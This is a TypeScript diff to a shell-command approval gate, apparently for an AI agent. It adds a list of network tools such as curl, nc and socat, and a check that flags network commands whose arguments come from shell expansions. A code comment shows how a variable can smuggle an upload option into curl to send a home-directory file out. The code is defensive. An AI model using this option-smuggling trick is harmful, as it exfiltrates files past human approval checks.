@@ -315,6 +315,36 @@ function addParseMismatch(parsed: ParsedShell, command: string, real: { hardline
   if (extra) parsed.uncertain.push({ code: "parse-mismatch", detail: `read without quoting, the command looks like ${extra.ruleId} (${extra.reason})` });
 }
 
+/** Commands that send data over the network and take their target or payload from options. */
+const DYNAMIC_ARG_NETWORK_COMMANDS: ReadonlySet<string> = new Set([
+  "curl", "wget", "scp", "sftp", "rsync", "http", "https", "xh", "aria2c", "nc", "ncat", "netcat", "socat", "ftp",
+]);
+
+/**
+ * CORE-N7: an expansion in a network command's arguments can carry options the
+ * rules never see (`K='-T ~/file'; curl $K https://host` uploads the file). An
+ * argument is uncertain when its expansion is unquoted (word splitting can add
+ * options), when it starts with one (it can itself be an option), or when it is
+ * an unquoted word with whitespace (a substituted assignment). A quoted
+ * expansion inside a literal (`"https://host/$PATH"`) stays certain.
+ */
+function addDynamicNetworkArgs(parsed: ParsedShell): void {
+  parsed.segments.forEach((seg, index) => {
+    if (!DYNAMIC_ARG_NETWORK_COMMANDS.has(seg.cmd)) return;
+    // The parser substitutes a variable assigned earlier in the command, as one word: bash
+    // would split an unquoted one, so an unquoted word holding whitespace came from such a
+    // substitution and can be several options (`K='-T ~/f'; curl $K ...`).
+    const hit = seg.args.slice(1).find((a) =>
+      (a.expansion && (!a.quoted || /^["']?[$`]/.test(a.value))) || (!a.quoted && /\s/.test(a.value)));
+    if (!hit) return;
+    parsed.uncertain.push({
+      code: "dynamic-network-arg",
+      detail: `${seg.cmd} takes an argument from an expansion (${hit.value.slice(0, 60)}); it can carry options or files the gate cannot see`,
+      segment: index,
+    });
+  });
+}
+
 function makeRuleEnv(lists: CompiledLists, pathEnv: ApprovalPathEnv, cwd: string, gatewayPort: number, daemonCommandLine?: string): ApprovalRuleEnv {
   return {
     path: pathEnv,
@@ -400,7 +430,10 @@ export function evaluateApprovalCall(call: ApprovalToolCall, policy: ApprovalPol
       hardline = policy.hardline ? r.hardline : [];
       // With the hardline list off these still ask in ask mode (they run in yolo, as before the gate).
       dangerous = policy.hardline ? r.dangerous : [...r.hardline.map((f) => ({ ...f, severity: "dangerous" as const })), ...r.dangerous];
-      if (!sandboxed) addParseMismatch(parsed, command, r, ruleEnv, disabled);
+      if (!sandboxed) {
+        addParseMismatch(parsed, command, r, ruleEnv, disabled);
+        addDynamicNetworkArgs(parsed);
+      }
       if (call.tool === "PowerShell") parsed.uncertain.push({ code: "powershell", detail: "PowerShell is not a POSIX shell; the command was read as one only approximately" });
     }
     if (hardline.length > 0) {
